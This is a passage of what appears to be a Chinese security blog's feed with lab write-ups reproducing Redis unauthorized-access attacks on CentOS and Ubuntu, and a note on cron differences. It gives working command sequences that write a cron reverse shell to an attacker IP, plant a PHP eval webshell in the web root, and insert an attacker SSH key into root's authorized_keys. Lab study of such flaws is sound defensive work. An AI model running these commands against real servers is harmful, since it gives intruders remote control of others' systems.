class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">set</span> aaa <span class="string">"\n\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.0.101/7777 0&gt;&amp;1\n\n"</span></div><div class="line">config <span class="built_in">set</span> dir /var/spool/cron</div><div class="line">config <span class="built_in">set</span> dbfilename root</div><div class="line">save</div></pre></td></tr></table></figure><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/56CBadKaEl.png?imageslim" alt="mark"><br><strong>在redis的交互shell中依次执行完上述命令后，可以看到成功的在centos的任务计划目录<code>/var/spool/cron</code>下创建了一个任务计划文件root，该文件里面的cron将执行每分钟执行一次向kali反弹shell的操作</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/l2k14IibBm.png?imageslim" alt="mark"></p><p><strong>可以看到我们的kali上已经接收到了centos反弹过来的shell，可以执行命令</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/Bc3EL7h89K.png?imageslim" alt="mark"></p><h3 id="利用redis未授权访问写webshell"><a href="#利用redis未授权访问写webshell" class="headerlink" title="利用redis未授权访问写webshell"></a>利用redis未授权访问写webshell</h3><p><strong>还可以通过redis未授权访问漏洞向网站根目录写一个webshell</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">set</span> aaa <span class="string">"\n\n&lt;?php @eval(<span class="variable">$_POST</span>['c1imber']);?&gt;\n\n"</span></div><div class="line">config <span class="built_in">set</span> dir /var/www/html</div><div class="line">config <span class="built_in">set</span> dbfilename shell.php</div><div class="line">save</div></pre></td></tr></table></figure><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/DE4e2A3L0D.png?imageslim" alt="mark"><br><strong>可以看到成功向网站根目录写了一个webshell</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/670dgDIH27.png?imageslim" alt="mark"><br><strong>访问该webshell，php一句话木马被解析</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/2D4BG6ebkA.png?imageslim" alt="mark"></p><h3 id="利用redis未授权访问向服务器写入ssh公钥"><a href="#利用redis未授权访问向服务器写入ssh公钥" class="headerlink" title="利用redis未授权访问向服务器写入ssh公钥"></a>利用redis未授权访问向服务器写入ssh公钥</h3><p><strong>该漏洞的前提需要centos允许使用shh密钥去登陆</strong></p><p><strong>接下来首先使用kali在本地生成一对密钥</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh-keygen -t rsa</div></pre></td></tr></table></figure><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/D5KF0LHCbI.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/hBIBd9J9kf.png?imageslim" alt="mark"><br><strong>之后将公钥<code>id_rsa.pub</code>写入到一个文件内</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(<span class="built_in">echo</span> -e <span class="string">"\n\n"</span>;cat id_rsa.pub;<span class="built_in">echo</span> -e <span class="string">"\n\n"</span>)&gt;key.txt</div></pre></td></tr></table></figure><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/HGJfgl2HGf.png?imageslim" alt="mark"><br><strong>之后利用redis未授权访问漏洞将公钥写到centos的<code>/root/.ssh/authorized_keys</code>文件中</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">cat /root/.ssh/key.txt | ./src/redis-cli -h 192.168.0.4 -x <span class="built_in">set</span> aaa</div><div class="line">redis -h 192.168.0.4 -p 6379</div><div class="line">config <span class="built_in">set</span> dir /root/.ssh</div><div class="line">config <span class="built_in">set</span> dbfilename authorized_keys</div><div class="line">save</div></pre></td></tr></table></figure><p><strong>其中<code>-x</code>参数代表读取输入流里的内设置给aaa，也就是之前生成的公钥<code>/root/.ssh/key.txt</code>里面的内容</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/c9G6E82kGG.png?imageslim" alt="mark"><br><strong>可以看到在centos的<code>/root/.ssh</code>目录下的<code>authorized_keys</code>文件里已经成功写入了我们刚刚生成的公钥</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/7ll8jEI5lJ.png?imageslim" alt="mark"><br><strong>由于我们将公钥写入了服务器，我们自己这有私钥，之后就可以使用ssh直接远程登陆了</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh 192.168.0.4</div></pre></td></tr></table></figure><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/gd8GC6lbie.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;centos环境下的redis未授权访问漏洞的几种利用方式&quot;&gt;&lt;a href=&quot;#centos环境下的redis未授权访问漏洞的几种利用方式&quot; class=&quot;headerlink&quot; title=&quot;centos环境下的redis未授权访问漏洞的几种利用方式&quot;&gt;&lt;/a&gt;centos环境下的redis未授权访问漏洞的几种利用方式&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;这篇文章记录一下redis未授权访问漏洞的几种利用方式,包括如何利用redis未授权访问漏洞通过任务计划反弹shell，向网站根目录写webshell以及利用redis未授权访问向服务器写入ssh公钥&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>记一次失败漏洞利用的经历--ubuntu下的redis未授权访问漏洞复现</title>
    <link href="http://yoursite.com/2018/08/19/2018-08-19/"/>
    <id>http://yoursite.com/2018/08/19/2018-08-19/</id>
    <published>2018-08-18T17:16:18.563Z</published>
    <updated>2018-08-24T17:06:41.828Z</updated>
    
    <content type="html"><![CDATA[<h1 id="记一次失败漏洞利用的经历–ubuntu下的redis未授权访问漏洞复现"><a href="#记一次失败漏洞利用的经历–ubuntu下的redis未授权访问漏洞复现" class="headerlink" title="记一次失败漏洞利用的经历–ubuntu下的redis未授权访问漏洞复现"></a>记一次失败漏洞利用的经历–ubuntu下的redis未授权访问漏洞复现</h1><p><strong>由于redis的配置不当导致攻击者可以利用该未授权访问漏洞去对服务器进行攻击，redis服务默认端口为6379端口，在利用该漏洞的时候，由于服务器是ubuntu的原因，遇到了不少坑导致最终并没有利用成功，不像之前在centos环境下利用该漏洞时那样顺利，所以在这里记录一下。在理解这篇文章之前，可以先参考一下之前的<a href="http://lawlietweb.com/2018/08/17/2018-08-17/#more" target="_blank" rel="external">解决ubuntu任务计划写shell失败的问题</a>和<a href="http://lawlietweb.com/2018/08/18/2018-08-18/#more" target="_blank" rel="external">关于ubuntu和centos cron的一些区别</a>这两篇文章</strong><br><a id="more"></a></p><h3 id="漏洞环境及搭建"><a href="#漏洞环境及搭建" class="headerlink" title="漏洞环境及搭建"></a>漏洞环境及搭建</h3><p><strong>ubuntu16.04（192.168.0.107）：安装了redis服务的靶机,作为redis-server</strong></p><p><strong>kali2.0（192.168.0.101）：攻击者机器，同样安装了redis，要使用redis-cli对未授权访问漏洞进行利用</strong></p><p><strong>该实验中redis的版本为4.0.8，安装redis方法如下</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">wget http://download.redis.io/releases/redis-4.0.8.tar.gz</div><div class="line">tar –xvf redis-4.0.8.tar.gz</div><div class="line"><span class="built_in">cd</span> redis-4.0.8</div><div class="line">make</div><div class="line">make install（加入到用户环境变量/usr/<span class="built_in">local</span>/bin）</div></pre></td></tr></table></figure><p><strong>ubuntu安装完redis后，还需要修改redis配置文件redis.conf里面的几个地方</strong></p><pre><code>1.bind 127.0.0.1前面需要加上注释符，保证远程ip可以访问redis数据库2.protected-mode要修改为no，否则远程连接数据库的ip执行不了数据库语句</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180816/HkF3EJj621.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180816/31fij0h7l1.png?imageslim" alt="mark"></p><h3 id="尝试利用linux任务计划文件去反弹shell"><a href="#尝试利用linux任务计划文件去反弹shell" class="headerlink" title="尝试利用linux任务计划文件去反弹shell"></a>尝试利用linux任务计划文件去反弹shell</h3><p><strong>首先在ubuntu上开启redis服务</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> redis-4.0.8</div><div class="line">./src/redis-server redis.conf</div></pre></td></tr></table></figure><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/li4i2IkkDB.png?imageslim" alt="mark"></p><p><strong>由于redis的默认配置会直接导致未授权访问，所以在kali上使用redis-cli去访问ubuntu靶机上的redis服务，这里看到可以直接进入redis的交互式shell</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> redis-4.0.8</div><div class="line">./src/redis-cli -h 192.168.0.107 -p 6379</div></pre></td></tr></table></figure><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/fffCjfk2Ie.png?imageslim" alt="mark"><br><strong>现在尝试结合linux任务计划文件去反弹一个shell到自己的kali上面。</strong></p><p><strong>首先简单来说一下linux中的任务计划文件，简单来说，任务计划指的就是使系统定时的去执行一些我们设置的任务，来看一下该文件的格式</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat /etc/crontab</div></pre></td></tr></table></figure><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180816/9EDGkJ5K49.png?imageslim" alt="mark"></p><p><strong>里面的参数和一些符号含义如下</strong></p><pre><code>m:分钟 - 从0到59的整数h:小时 - 从0到23的整数dom:天 - 从1到31的整数 (必须是指定月份的有效日期)mon:月 - 从1到12的整数 (或如Jan或Feb简写的月份)dow:周一到周日 - 从0到7的整数，0或7用来描述周日 (或用Sun或Mon简写来表示)user:指的是执行命令的用户command: 需要执行的命令星号(*)表示参数所有可用的值，如果为5个*，就代表每分钟执行一次符号“/”指定步进设置。“/&lt;interger&gt;”表示步进值,比如*/2 * * * *代表每两分钟执行一次任务</code></pre><p><strong>ubuntu下可以利用的cron有以下几个地方</strong></p><pre><code>/etc/crontab：该文件里面的任务计划可以直接执行/etc/cron.d/*：该目录下的任意文件都可以被当作任务计划去执行，并且避免了原先任务计划文件被覆盖的情况/var/spool/cron/crontabs/：该目录下定义的任务计划文件会被执行，不过需要有一个前提，就是该任务计划文件的权限必须为600</code></pre><p><strong>知道了以上的知识，可以通过redis未授权访问漏洞向ubuntu的<code>/etc/cron.d</code>目录下写任务计划文件去反弹shell,首先在kali上监听端口等待连接，我的思路是这样的，首先向/etc/cron.d下写一个任务计划文件step1，文件内容为<code>* * * * * root ln -s -f bash /bin/sh</code>，首先将ubuntu的cron的shell环境由dash改为bash，这样才可以使用交互式命令，之后再在<code>/etc/cron.d</code>目录下创建一个任务计划文件step2，内容为<code>* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.0.101/7777 0&gt;&amp;1</code>,也就是使用交互式的bash去反弹shell到kali</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -nvlp 7777</div></pre></td></tr></table></figure><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/bbl7Dm2Hea.png?imageslim" alt="mark"><br><strong>接下来在redis-cli命令行输入</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">set</span> aaa <span class="string">"\n\n\n\n* * * * * root ln -s -f bash /bin/sh\n\n\n\n"</span></div><div class="line">config <span class="built_in">set</span> dir /etc/cron.d</div><div class="line">config <span class="built_in">set</span> dbfilename step1</div><div class="line">save</div><div class="line"><span class="built_in">set</span> bbb <span class="string">"\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.0.101/7777 0&gt;&amp;1\n\n\n\n"</span></div><div class="line">config <span class="built_in">set</span> dir /etc/cron.d</div><div class="line">config <span class="built_in">set</span> dbfilename step2</div><div class="line">save</div></pre></td></tr></table></figure><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/gGeJheDh71.png?imageslim" alt="mark"></p><p><strong>这里有一个需要注意的地方就是在设置变量的时候，也就是设置任务计划文件里的内容时，<code>\n</code>这个符号前后分别不能小于2个，否则文件内容里面的任务计划会出现乱码导致命令执行失败，这是其中一个坑,可以看到<code>/etc/cron.d</code>目录下分别成功创建了一个名为step1和step2的任务计划文件</strong></p><p><strong>文件内容分别为</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/aL0DJmLL5D.png?imageslim" alt="mark"></p><p><strong>但是shell还是反弹失败了，<code>/bin/sh</code>的指向也没有修改成功，通过查看日志可以看到这一次的错误原因是<code>ERROR (Syntax error, this crontab file will be ignored)</code></strong></p><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/848Lkaj8EF.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/4IdFkL5gci.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/E2h2Fm7ffc.png?imageslim" alt="mark"></p><p><strong>这是由于redis向任务计划文件里写内容出现乱码而导致的语法错误，而乱码是避免不了的，centos会忽略乱码去执行格式正确的任务计划，而ubuntu并不会忽略这些乱码，所以导致命令执行失败，因为自己如果不使用redis写任务计划文件，而是正常向<code>/etc/cron.d</code>目录下写任务计划文件的话，命令是可以正常执行的，所以还是乱码的原因导致命令不能正常执行，而这个问题是不能解决的，因为利用redis未授权访问写的任务计划文件里都有乱码，这些代码来自redis的缓存数据</strong></p><h3 id="对于这一次失败的总结和看法"><a href="#对于这一次失败的总结和看法" class="headerlink" title="对于这一次失败的总结和看法"></a>对于这一次失败的总结和看法</h3><p><strong>对于ubuntu环境下的redis未授权访问漏洞写任务计划反弹shell的利用，自己遇到了很多坑，自己都一一排查解决了，结果最终还是在乱码这个问题上失败了，也可以看出确实ubuntu在某些方面设计的还是要比centos安全的，虽然这次漏洞利用失败了，但是自己也学到了不少，对centos和ubuntu这两个系统的cron的区别以及一些其它的安全机制有了更深的认识，所以，虽然失败，但是这一切都是值得的</strong></p><h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p><strong>既然在ubuntu下写任务计划反弹shell这种方法不可行是因为ubuntu cron的原因，那么还是可以尝试其它的一些方式去利用该redis未授权访问漏洞的，比如利用redis写webshell或者向服务器写入ssh公钥去远程登陆，下面来说一下ubuntu环境下的redis未授权访问漏洞的另外两种利用手法</strong></p><h3 id="利用redis未授权访问写webshell"><a href="#利用redis未授权访问写webshell" class="headerlink" title="利用redis未授权访问写webshell"></a>利用redis未授权访问写webshell</h3><p><strong>通过redis未授权访问漏洞向ubuntu的web跟目录下写入一个webshell，然后要知道网站的根目录，在该测试环境下网站的根目录为<code>/var/www/html</code>,在kali的redis-cli的交互式shell下执行</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">set</span> aaa <span class="string">"\n\n\&lt;?php @eval(<span class="variable">$_POST</span>['c1imber']);?&gt;\n\n"</span></div><div class="line">config <span class="built_in">set</span> dir /var/www/html</div><div class="line">config <span class="built_in">set</span> dbfilename shell.php</div><div class="line">save</div></pre></td></tr></table></figure><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/iJLjC1JD7B.png?imageslim" alt="mark"><br><strong>执行成功后可以看到在ubuntu的网站跟目录下成功写入了一个webshell,如果想让php解析，需要安装<code>libapache2-mod-php</code>这个扩展</strong></p><pre><code>sudo apt-get install libapache2-mod-php</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/fClIhiBE92.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/IBEEbfgDJj.png?imageslim" alt="mark"></p><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180820/eke56eebcF.png?imageslim" alt="mark"></p><h3 id="利用redis未授权访问向远程服务器写入ssh公钥"><a href="#利用redis未授权访问向远程服务器写入ssh公钥" class="headerlink" title="利用redis未授权访问向远程服务器写入ssh公钥"></a>利用redis未授权访问向远程服务器写入ssh公钥</h3><p><strong>ubuntu想要ssh远程登陆，首先需要安装openssh-server</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get install openssh-server</div></pre></td></tr></table></figure><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180822/68m41gGBdj.png?imageslim" alt="mark"><br><strong>然后需要ubuntu开放22端口允许ssh远程登陆并且开启密钥登陆，这里要修改ubuntu的<code>openssh-server</code>的配置文件<code>/etc/ssh/sshd_config</code>里的几个地方</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180822/Di4g4GhlKE.png?imageslim" alt="mark"></p><p><strong>其中<code>RhostsRSAAuthentication yes</code>代表允许远程RSA认证登陆，也就是密钥登陆，<code>AuthorizedKeysFile %h/.ssh/authorized_keys</code>代表服务器公钥的存放位置，也是要利用redis未授权访问漏洞写入公钥文件的位置</strong></p><p><strong>修改完成后重启ssh服务</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">service ssh restart</div></pre></td></tr></table></figure><p><strong>之后在ubuntu的root目录下新建一个名为<code>.ssh</code>的目录</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> /root</div><div class="line">mkdir .ssh</div></pre></td></tr></table></figure><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180822/3fdg73Gl2F.png?imageslim" alt="mark"></p><p><strong>接下来使用kali在本地生成一对密钥</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh-keygen -t rsa</div></pre></td></tr></table></figure><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/D5KF0LHCbI.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/hBIBd9J9kf.png?imageslim" alt="mark"><br><strong>之后将公钥<code>id_rsa.pub</code>写入到一个文件内</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(<span class="built_in">echo</span> -e <span class="string">"\n\n"</span>;cat id_rsa.pub;<span class="built_in">echo</span> -e <span class="string">"\n\n"</span>)&gt;key.txt</div></pre></td></tr></table></figure><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/HGJfgl2HGf.png?imageslim" alt="mark"><br><strong>之后利用redis未授权访问漏洞将公钥写到centos的<code>/root/.ssh/id_rsa</code>文件中，首先</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat /root/.ssh/key.txt | ./src/redis-cli -h 192.168.0.107 -x <span class="built_in">set</span> aaa</div></pre></td></tr></table></figure><p><strong>将刚刚生成的公钥设置给redis里的变量aaa</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180822/hC3l8d6iak.png?imageslim" alt="mark"><br><strong>接下来在kali的redis-cli的交互式shell下执行</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">config <span class="built_in">set</span> dir /root/.ssh</div><div class="line">config <span class="built_in">set</span> dbfilename authorized_keys</div><div class="line">save</div></pre></td></tr></table></figure><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180822/g09I15ABF0.png?imageslim" alt="mark"></p><p><strong>执行完毕后会在ubuntu服务器的<code>/root/.ssh</code>目录下生成一个<code>authorized_keys</code>的公钥文件，利用这个公钥文件就可以远程连接这台ubuntu了</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180822/8gBjG01E3f.png?imageslim" alt="mark"></p><p><strong>ssh远程连接</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh 192.168.0.107</div></pre></td></tr></table></figure></p><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180822/LHC200k4jh.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;记一次失败漏洞利用的经历–ubuntu下的redis未授权访问漏洞复现&quot;&gt;&lt;a href=&quot;#记一次失败漏洞利用的经历–ubuntu下的redis未授权访问漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;记一次失败漏洞利用的经历–ubuntu下的redis未授权访问漏洞复现&quot;&gt;&lt;/a&gt;记一次失败漏洞利用的经历–ubuntu下的redis未授权访问漏洞复现&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;由于redis的配置不当导致攻击者可以利用该未授权访问漏洞去对服务器进行攻击，redis服务默认端口为6379端口，在利用该漏洞的时候，由于服务器是ubuntu的原因，遇到了不少坑导致最终并没有利用成功，不像之前在centos环境下利用该漏洞时那样顺利，所以在这里记录一下。在理解这篇文章之前，可以先参考一下之前的&lt;a href=&quot;http://lawlietweb.com/2018/08/17/2018-08-17/#more&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;解决ubuntu任务计划写shell失败的问题&lt;/a&gt;和&lt;a href=&quot;http://lawlietweb.com/2018/08/18/2018-08-18/#more&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;关于ubuntu和centos cron的一些区别&lt;/a&gt;这两篇文章&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>关于ubuntu和centos cron的一些区别</title>
    <link href="http://yoursite.com/2018/08/18/2018-08-18/"/>
    <id>http://yoursite.com/2018/08/18/2018-08-18/</id>
    <published>2018-08-18T14:01:54.485Z</published>
    <updated>2018-08-18T16:43:52.335Z</updated>
    
    <content type="html"><![CDATA[<h1 id="关于ubuntu和centos-cron的一些区别"><a href="#关于ubuntu和centos-cron的一些区别" class="headerlink" title="关于ubuntu和centos cron的一些区别"></a>关于ubuntu和centos cron的一些区别</h1><p><strong>写这篇文章的目的，源自<a href="http://lawlietweb.com/2018/08/17/2018-08-17/#more" target="_blank" rel="external">解决ubuntu任务计划写shell失败的问题</a>这篇文章遗留下来的一个问题：就是在向ubuntu的<code>/var/spool/cron/crontabs</code>目录下创建任务计划文件时，需要修改该文件的权限为<code>600</code>,也就是<code>r------</code>，该任务计划文件才能执行，否则就会报错不能执行，报出<code>(root) INSECURE MODE (mode 0600 expected)</code>这个错误，这个问题当时没有太注意，以为是umask不同的问题。直到今天再次利用ubuntu环境下的redis未授权访问漏洞反弹shell时才发现这样一个问题，就是我们并不能直接利用未授权访问漏洞去修改<code>/var/spool/cron/crontabs</code>目录下我们创建的任务计划文件的权限，所以导致任务计划文件不能执行，于是又研究了一番，偶然发现ubuntu和centos的umask是相同的，都是<code>0022</code>，说明之前自己的想法是错误的，并不是umask不同的问题，而是centos和ubuntu cron的区别，下面就来总结一下其cron的区别</strong><br><a id="more"></a></p><p><strong>简单来说</strong></p><p><strong>ubuntu任务计划有一个目录是/var/spool/cron/crontabs，不过这个目录下的文件权限必须为600任务计划才能执行，这个是和centos的一个区别，但是如果利用redis漏洞的话，不可能直接去修改文件权限为600，而且如果写到/etc/crontab这个文件里的话，会覆盖掉之前的任务计划，所以如果服务器是ubuntu的话，可以写到/etc/cron.d这个任务计划目录下，这个目录下没有要求文件权限是600，并不会报错</strong></p><p><strong>下面来总结一下ubuntu和centos的cron</strong></p><p><strong>ubuntu的cron</strong></p><p><code>/etc/crontab</code><strong>：该文件中的任务计划写入就能直接执行</strong></p><p><code>/etc/cron.d</code><strong>：该目录下的文件为任务计划文件，只要文件内容格式符合cron的格式，就会执行</strong></p><p><code>/var/spool/cron/crontabs</code><strong>：该目录下的文件为任务计划文件，不过只有当任务计划文件的权限为<code>600</code>这个权限时任务计划才能执行，否则会报出<code>(root) INSECURE MODE (mode 0600 expected)</code>这个问题</strong></p><p><strong>centos的cron</strong></p><p><code>/etc/crontab</code><strong>：该文件中的任务计划写入就能直接执行</strong></p><p><code>/etc/cron.d</code><strong>：该目录下的文件为任务计划文件，只要文件内容格式符合cron的格式，就会执行</strong></p><p><strong>以上两点和ubuntu的cron没什么区别，唯一的区别是，centos的任务计划文件目录为<code>/var/spool/cron</code>这个目录，而且该目录下的任务计划文件并没有要求权限为<code>600</code>才能执行，这就是ubuntu和centos cron的一个区别，同时也是一个比较坑的地方，值得记录一下，以免以后忘记，至于为什么ubuntu和centos会有这样的区别，我认为和任务计划的目录有关系</strong></p><p><strong>centos的<code>/var/spool/cron</code>任务计划目录权限</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/bamjJLLBCm.png?imageslim" alt="mark"></p><p><strong>ubuntu的<code>/var/spool/cron/crontabs</code>任务计划目录</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/jD60555DCg.png?imageslim" alt="mark"></p><p><strong>可以看到两个任务计划目录的权限是不一样的，这也是ubuntu和centos cron不同的原因。以后再深入去研究</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;关于ubuntu和centos-cron的一些区别&quot;&gt;&lt;a href=&quot;#关于ubuntu和centos-cron的一些区别&quot; class=&quot;headerlink&quot; title=&quot;关于ubuntu和centos cron的一些区别&quot;&gt;&lt;/a&gt;关于ubuntu和centos cron的一些区别&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;写这篇文章的目的，源自&lt;a href=&quot;http://lawlietweb.com/2018/08/17/2018-08-17/#more&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;解决ubuntu任务计划写shell失败的问题&lt;/a&gt;这篇文章遗留下来的一个问题：就是在向ubuntu的&lt;code&gt;/var/spool/cron/crontabs&lt;/code&gt;目录下创建任务计划文件时，需要修改该文件的权限为&lt;code&gt;600&lt;/code&gt;,也就是&lt;code&gt;r------&lt;/code&gt;，该任务计划文件才能执行，否则就会报错不能执行，报出&lt;code&gt;(root) INSECURE MODE (mode 0600 expected)&lt;/code&gt;这个错误，这个问题当时没有太注意，以为是umask不同的问题。直到今天再次利用ubuntu环境下的redis未授权访问漏洞反弹shell时才发现这样一个问题，就是我们并不能直接利用未授权访问漏洞去修改&lt;code&gt;/var/spool/cron/crontabs&lt;/code&gt;目录下我们创建的任务计划文件的权限，所以导致任务计划文件不能执行，于是又研究了一番，偶然发现ubuntu和centos的umask是相同的，都是&lt;code&gt;0022&lt;/code&gt;，说明之前自己的想法是错误的，并不是umask不同的问题，而是centos和ubuntu cron的区别，下面就来总结一下其cron的区别&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Linux渗透" scheme="http://yoursite.com/categories/Linux%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="Linux" scheme="http://yoursite.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>解决ubuntu任务计划写shell失败的问题</title>
    <link href="http://yoursite.com/2018/08/17/2018-08-17/"/>
    <id>http://yoursite.com/2018/08/17/2018-08-17/</id>
    <published>2018-08-17T15:01:14.850Z</published>
    <updated>2018-08-18T13:56:47.915Z</updated>
    
    <content type="html"><![CDATA[<h1 id="解决ubuntu任务计划写shell失败的问题"><a href="#解决ubuntu任务计划写shell失败的问题" class="headerlink" title="解决ubuntu任务计划写shell失败的问题"></a>解决ubuntu任务计划写shell失败的问题</h1><p><strong>这个问题的由来是因为自己在复现redis未授权访问漏洞时，通过向linux任务计划文件里写反弹shell的命令时，发现shell并不能反弹回来，之前使用的server端为Centos，一切顺利并没有出现这种问题，结果这次server换成了ubuntu，就出现不能反弹的问题，结果因为这个问题卡了很久，最终在kakaxi和ttgo2两位大佬的指导和帮助下才解决了该问题，将整个问题的解决过程在这里记录一下~</strong><br><a id="more"></a></p><h3 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h3><p><strong>ubuntu16.04桌面版：192.168.0.107，用来任务计划反弹shell的靶机</strong></p><p><strong>kali2.0：192.168.0.106，用来接收ubuntu反弹过来的shell</strong></p><h3 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h3><p><strong>事情源自于我利用redis未授权访问漏洞在向<code>ubuntu</code>的<code>/var/spool/cron/crontabs</code>目录下创建任务计划文件去反弹shell时，发现shell并不能反弹到自己的kali上</strong></p><p><strong>任务计划文件<code>/var/spool/cron/crontabs/root</code>内容如下</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div 